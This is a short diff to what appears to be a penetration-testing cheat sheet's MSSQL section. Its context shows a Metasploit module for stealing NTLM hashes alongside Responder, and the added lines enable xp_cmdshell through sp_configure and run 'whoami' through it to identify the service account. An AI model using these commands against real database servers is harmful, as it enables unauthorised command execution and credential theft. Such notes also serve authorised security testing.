@@ -145,6 +145,17 @@ SELECT * FROM dbo.backupset
 # Steal NTLM
 msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
 
+#this turns on advanced options and is needed to configure xp_cmdshell
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+
+#this enables xp_cmdshell
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+
+# Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
+
 ```
 ### SMTP
 ```bash
